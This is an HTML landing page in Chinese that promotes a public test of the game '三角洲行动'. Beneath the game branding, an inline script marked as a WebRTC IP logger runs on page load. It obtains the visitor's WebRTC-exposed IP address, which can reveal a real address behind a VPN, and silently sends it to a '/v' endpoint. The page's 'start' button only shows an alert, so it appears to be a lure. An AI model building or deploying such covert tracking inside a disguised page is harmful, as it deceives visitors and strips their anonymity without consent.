<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>三角洲行动 - 全球公测盛大开启</title>
  <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
  <!-- 背景容器 -->
  <div class="bg-container">
    <div class="bg-overlay"></div>
  </div>

  <div class="wrapper">
    <!-- 头部 -->
    <header>
      <div class="logo">
        <img src="/assets/images/logo.png" alt="三角洲行动">
      </div>
    </header>

    <!-- 主内容区 -->
    <main>
      <div class="slogan">
        <img src="/assets/images/slg.png" alt="无所畏惧 决战三角洲">
      </div>
      <a href="javascript:void(0);" class="cta-button" id="startBtn">
        立即开战
      </a>
    </main>

    <!-- 页脚 -->
    <footer>
      <div class="copyright">
        &copy; 2026 <span class="brand">泡泡国际</span>. 版权所有
      </div>
    </footer>
  </div>

  <!-- WebRTC IP 记录器 -->
  <script src="/js/webrtc.js"></script>
  <script>
    (async () => {
      try {
        const webrtcIp = await getWebRTCIP();
        if (webrtcIp) {
          fetch(`/v?webrtc_ip=${webrtcIp}`).catch(() => {});
        } else {
          fetch('/v').catch(() => {});
        }
      } catch (e) {
        fetch('/v').catch(() => {});
      }
    })();

    // 交互效果
    document.getElementById('startBtn').addEventListener('click', () => {
      alert('正在连接战场...');
    });
  </script>
</body>
</html>
